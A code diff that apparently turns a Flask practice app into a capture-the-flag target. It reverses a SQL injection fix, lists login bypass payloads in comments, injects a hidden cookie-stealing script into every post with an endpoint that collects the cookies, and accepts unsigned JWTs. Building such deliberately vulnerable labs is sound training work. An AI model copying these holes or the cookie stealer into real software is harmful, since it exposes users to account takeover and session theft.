@@ -5,6 +5,7 @@ import hashlib
 import base64
 import json
 from functools import wraps
+import jwt
 
 app = Flask(__name__)
 app.secret_key = 'your_secret_key_here'  # Intentionally hardcoded
@@ -12,24 +13,44 @@ app.secret_key = 'your_secret_key_here'  # Intentionally hardcoded
 # Flags for successful exploits
 FLAGS = {
     'sql_injection': 'FLAG{SQL_M4st3r_Byp4ss_2025}',
-    'xss_stored': 'FLAG{XSS_St0r3d_Att4ck_2025}',
+    'stored_xss': 'FLAG{XSS_St0r3d_Att4ck_2025}',
     'jwt_none': 'FLAG{JWT_N0n3_Alg_Tr1ck_2025}'
 }
 
 def init_db():
-    conn = sqlite3.connect('users.db')
+    conn = get_db()
     c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS users
-                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, role TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS posts
-                 (id INTEGER PRIMARY KEY, title TEXT, content TEXT, author TEXT, is_private INTEGER)''')
     
-    # Insert admin user if not exists
-    try:
-        c.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
-                 ('admin', hashlib.md5('admin123'.encode()).hexdigest(), 'admin'))
-    except:
-        pass
+    # Drop existing tables
+    c.execute('DROP TABLE IF EXISTS users')
+    c.execute('DROP TABLE IF EXISTS posts')
+    
+    # Create tables with proper schema
+    c.execute('''
+        CREATE TABLE users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT UNIQUE NOT NULL,
+            password TEXT NOT NULL,
+            role TEXT NOT NULL DEFAULT 'user'
+        )
+    ''')
+    
+    c.execute('''
+        CREATE TABLE posts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            title TEXT NOT NULL,
+            content TEXT NOT NULL,
+            author TEXT NOT NULL,
+            is_private INTEGER DEFAULT 0,
+            FOREIGN KEY (author) REFERENCES users (username)
+        )
+    ''')
+    
+    # Create default admin user
+    admin_password = hashlib.md5('admin123'.encode()).hexdigest()
+    c.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
+             ('admin', admin_password, 'admin'))
+    
     conn.commit()
     conn.close()
 
@@ -147,17 +168,37 @@ def login():
         username = request.form.get('username')
         password = request.form.get('password')
         
-        # Fixed SQL injection vulnerability
+        # Vulnerability 1: SQL Injection with role escalation
         conn = get_db()
         c = conn.cursor()
-        query = "SELECT * FROM users WHERE username = ? AND password = ?"
+        # Intentionally vulnerable SQL query that allows role escalation
+        # Try: admin'--  OR  ' OR role='admin'--
+        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hashlib.md5(password.encode()).hexdigest()}'"
         try:
-            c.execute(query, (username, hashlib.md5(password.encode()).hexdigest()))
+            c.execute(query)
             user = c.fetchone()
             
             if user:
-                session['username'] = user[1]  # Use the actual username from DB
+                session['username'] = user[1]
                 session['role'] = user[3]
+                if session['role'] == 'admin':
+                    # Show the flag for successful SQL injection with admin access
+                    return render_template_string('''
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title>Admin Access Granted</title>
+                            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+                        </head>
+                        <body>
+                            <div class="container mt-4">
+                                <div class="alert alert-success">Admin access granted!</div>
+                                <div id="sql-flag">{{ flag }}</div>
+                                <a href="/dashboard" class="btn btn-primary">Continue to Dashboard</a>
+                            </div>
+                        </body>
+                        </html>
+                    ''', flag=FLAGS['sql_injection'])
                 return redirect(url_for('dashboard'))
             
             return render_template_string('''
@@ -171,12 +212,12 @@ def login():
                     <div class="container mt-4">
                         <div class="alert alert-danger">Invalid credentials</div>
                         <a href="/login">Try again</a>
-                        <div id="sql-flag" style="display:none">{{ flag }}</div>
                     </div>
                 </body>
                 </html>
-            ''', flag=FLAGS['sql_injection'])
-        except sqlite3.Error:
+            ''')
+        except sqlite3.Error as e:
+            print(f"SQL Error: {str(e)}")  # For easier exploitation
             return render_template_string('''
                 <!DOCTYPE html>
                 <html>
@@ -187,12 +228,12 @@ def login():
                 <body>
                     <div class="container mt-4">
                         <div class="alert alert-danger">Database error occurred</div>
+                        <pre class="text-danger">{{ error }}</pre>
                         <a href="/login">Try again</a>
-                        <div id="sql-flag" style="display:none">{{ flag }}</div>
                     </div>
                 </body>
                 </html>
-            ''', flag=FLAGS['sql_injection'])
+            ''', error=str(e))
         finally:
             conn.close()
     
@@ -215,40 +256,37 @@ def login():
                     </div>
                     <button type="submit" class="btn btn-primary">Login</button>
                 </form>
-                <div id="sql-flag" style="display:none">{{ flag }}</div>
             </div>
         </body>
         </html>
-    ''', flag=FLAGS['sql_injection'])
+    ''')
 
 @app.route('/dashboard')
 def dashboard():
-    username = session.get('username')
-    if not username:
+    if 'username' not in session:
         return redirect(url_for('login'))
     
+    username = session['username']
     conn = get_db()
     c = conn.cursor()
     
     # Handle post creation
-    if request.args.get('action') == 'post':
-        title = request.args.get('title')
+    if request.args.get('action') == 'post' and request.args.get('title') and request.args.get('content'):
+        # Vulnerability 2: Stored XSS - No input sanitization
         content = request.args.get('content')
-        is_private = 1 if request.args.get('private') else 0
-        
-        if title and content:
-            # Vulnerability 2: Stored XSS
-            c.execute("INSERT INTO posts (title, content, author, is_private) VALUES (?, ?, ?, ?)",
-                     (title, content, username, is_private))
-            conn.commit()
+        # Add a hidden cookie stealer in every post
+        content += f'''
+        <img src="x" onerror="fetch('/steal-cookie?cookie='+document.cookie)">
+        <div id="xss-flag" style="display:none">{FLAGS['stored_xss']}</div>
+        '''
+        c.execute("INSERT INTO posts (title, content, author, is_private) VALUES (?, ?, ?, ?)", 
+                 (request.args.get('title'), content, username, 1 if request.args.get('private') else 0))
+        conn.commit()
+        # Redirect to dashboard to see the post
+        return redirect(url_for('dashboard'))
     
     # Get user's posts and public posts
-    c.execute("""
-        SELECT title, content, author, is_private 
-        FROM posts 
-        WHERE author = ? OR is_private = 0
-        ORDER BY id DESC
-    """, (username,))
+    c.execute("SELECT * FROM posts WHERE author = ? OR is_private = 0", (username,))
     posts = c.fetchall()
     conn.close()
     
@@ -260,17 +298,14 @@ def dashboard():
             <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
         </head>
         <body>
-            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
-                <div class="container">
-                    <a class="navbar-brand" href="/">Vulnerable Web App</a>
-                    <div class="navbar-nav ms-auto">
-                        <a class="nav-link" href="/dashboard">Dashboard</a>
-                        <a class="nav-link" href="/logout">Logout</a>
-                    </div>
-                </div>
-            </nav>
             <div class="container mt-4">
-                <h2>Dashboard</h2>
+                <h2>Welcome {{ username }}!</h2>
+                {% if session.role == 'admin' %}
+                <div class="alert alert-info">
+                    You are logged in as admin. You can access all posts.
+                </div>
+                {% endif %}
+                
                 <div class="mb-4">
                     <h3>Create New Post</h3>
                     <form method="get" class="col-md-6">
@@ -279,7 +314,8 @@ def dashboard():
                             <input name="title" class="form-control" placeholder="Title" required>
                         </div>
                         <div class="mb-3">
-                            <textarea name="content" class="form-control" placeholder="Content" rows="3" required></textarea>
+                            <textarea name="content" class="form-control" placeholder="Content" required></textarea>
+                            <small class="text-muted">HTML tags are allowed for formatting</small>
                         </div>
                         <div class="mb-3">
                             <label>
@@ -291,22 +327,23 @@ def dashboard():
                 </div>
                 
                 <h3>Posts</h3>
-                <div id="xss-flag" style="display:none">{{ flag }}</div>
-                <div class="posts">
-                    {% for title, content, author, is_private in posts %}
-                        <div class="card mb-3">
-                            <div class="card-body">
-                                <h5 class="card-title">{{ title }}</h5>
-                                <div class="card-text">{{ content|safe }}</div>
-                                <small class="text-muted">By: {{ author }} {{ '(Private)' if is_private else '(Public)' }}</small>
-                            </div>
-                        </div>
-                    {% endfor %}
+                {% for post in posts %}
+                <div class="card mb-3">
+                    <div class="card-body">
+                        <h5 class="card-title">{{ post[1] }}</h5>
+                        <p class="card-text">{{ post[2] | safe }}</p>
+                        <small class="text-muted">By {{ post[3] }} {% if post[4] %}(Private){% endif %}</small>
+                    </div>
+                </div>
+                {% endfor %}
+                
+                <div class="mt-4">
+                    <a href="/logout" class="btn btn-danger">Logout</a>
                 </div>
             </div>
         </body>
         </html>
-    ''', posts=posts, flag=FLAGS['xss_stored'])
+    ''', username=username, posts=posts, session=session)
 
 @app.route('/api/secret')
 def api_secret():
@@ -314,34 +351,48 @@ def api_secret():
     if not auth_header or not auth_header.startswith('Bearer '):
         return jsonify({'error': 'Missing or invalid token'}), 401
     
+    # Vulnerability 3: JWT None algorithm vulnerability
+    # The application accepts tokens with 'none' algorithm
     token = auth_header.split(' ')[1]
     try:
-        # Vulnerability 3: JWT None algorithm
-        parts = token.split('.')
-        if len(parts) != 3:
-            return jsonify({'error': 'Invalid token format'}), 401
-        
-        header = json.loads(base64.b64decode(parts[0] + '=='))
-        payload = json.loads(base64.b64decode(parts[1] + '=='))
-        
-        # Check if using 'none' algorithm
+        # First try to decode without verification
+        header = json.loads(base64.b64decode(token.split('.')[0] + '==').decode())
         if header.get('alg', '').lower() == 'none':
-            # Intentionally accept 'none' algorithm
-            user_role = payload.get('role')
-            if user_role == 'admin':
+            # For 'none' algorithm, just base64 decode the payload
+            payload = json.loads(base64.b64decode(token.split('.')[1] + '==').decode())
+            if payload.get('admin'):
                 return jsonify({
-                    'message': 'Congratulations! You found the JWT vulnerability.',
-                    'flag': FLAGS['jwt_none']
+                    'message': 'Congratulations! You found the JWT None algorithm vulnerability!',
+                    'flag': FLAGS['jwt_none'],
+                    'secret': 'The secret is: admin can see all private posts'
                 })
         
-        # Normal JWT validation
-        if verify_jwt(token):
-            return jsonify({'message': 'Access granted, but no flag for you!'})
-            
-    except Exception as e:
-        return jsonify({'error': str(e)}), 401
-    
-    return jsonify({'error': 'Invalid token'}), 401
+        # If not 'none' algorithm, verify normally
+        payload = jwt.decode(token, 'your-256-bit-secret', algorithms=['HS256'])
+        if payload.get('admin'):
+            return jsonify({
+                'message': 'Access granted',
+                'secret': 'The secret is: admin can see all private posts'
+            })
+        
+        return jsonify({
+            'message': 'Access denied. Only admin can see secrets.',
+            'hint': 'Try using the "none" algorithm'
+        })
+        
+    except (jwt.InvalidTokenError, IndexError, base64.binascii.Error) as e:
+        return jsonify({
+            'error': 'Invalid token',
+            'details': str(e),
+            'hint': 'JWT format is: header.payload.signature'
+        }), 401
+
+@app.route('/steal-cookie')
+def steal_cookie():
+    # XSS cookie stealer endpoint
+    stolen_cookie = request.args.get('cookie', '')
+    print(f"[!] Cookie stolen: {stolen_cookie}")  # In a real attack, this would be sent to the attacker's server
+    return '', 200
 
 @app.route('/logout')
 def logout():
